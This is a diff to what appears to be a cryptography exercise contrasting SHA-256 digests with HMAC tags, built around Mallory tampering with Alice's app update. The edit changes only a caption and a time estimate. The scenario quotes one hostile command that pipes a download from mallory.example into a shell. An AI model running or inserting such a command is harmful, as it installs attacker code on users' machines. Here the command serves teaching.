@@ -4,7 +4,7 @@
 
 Alice publishes updates of her Notes app with their SHA-256 on her download page. Mallory broke into the server: she added one line to the update (`curl -s http://mallory.example/steal | sh`, which downloads and runs her program) and put the SHA-256 of her file on the page. Alice and Bob also share a secret MAC key, and Alice sends an HMAC-SHA256 tag with each update. Mallory can copy Alice's tag, but she does not know the key. At the end, Bob writes a note himself and shows it with a tag to Carol, a judge, who is given the key.
 
-![Alice's update and Mallory's update with one extra line. The download page shows Mallory's SHA-256 b4d421a7...7aad982d. Bob checks: digest of Mallory's file = page? Tag of Alice's file = Alice's tag? Tag of Mallory's file = Alice's tag? Then Bob makes a tag for the note "Alice owes Bob 500 pounds. Signed: Alice" and Carol checks it with the same key: ?](figure.svg)
+![Alice's update and Mallory's update with one extra line. The download page shows Mallory's SHA-256 b4d421a7...7aad982d. Bob checks: digest of Mallory's file = page? Tag of Alice's file = Alice's tag? Tag of Mallory's file = Alice's tag? Then Bob makes a tag for the note "Alice owes Bob 500 pounds." and Carol checks it with the same key: ?](figure.svg)
 
 ## Goal
 
@@ -51,4 +51,4 @@ The digest from the page let Mallory's file through: anybody can compute a SHA-2
 python3 who_made_it.py
 ```
 
-About 8 minutes. Python 3, no extra libraries.
+About 10 minutes. Python 3, no extra libraries.
